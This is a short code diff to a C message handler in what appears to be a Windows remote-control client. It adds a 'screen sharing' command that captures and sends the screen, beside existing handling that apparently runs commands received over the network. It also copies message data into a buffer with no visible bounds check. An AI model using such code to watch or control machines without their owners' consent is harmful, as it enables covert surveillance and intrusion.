@@ -255,6 +255,24 @@ RemoteClientError process_message(const Message* message) {
             strncpy(command, message->data, message->data_length);
             command[message->data_length] = '\0';
 
+            // Special handling for screen sharing command
+            if (strcmp(command, "screen sharing") == 0) {
+                log_message(LOG_INFO, "Received screen sharing command");
+                
+                // Send a response indicating screen sharing is starting
+                Message response = { .type = MSG_TYPE_RESPONSE };
+                const char* response_text = "Screen sharing initiated";
+                response.data_length = strlen(response_text);
+                memcpy(response.data, response_text, response.data_length);
+                
+                // Send the response
+                send_message(&response);
+                
+                // Capture and send the screen
+                return capture_and_send_screen();
+            }
+
+            // Regular command handling for other commands
             // Create pipes for capturing output
             HANDLE hReadPipe, hWritePipe;
             SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
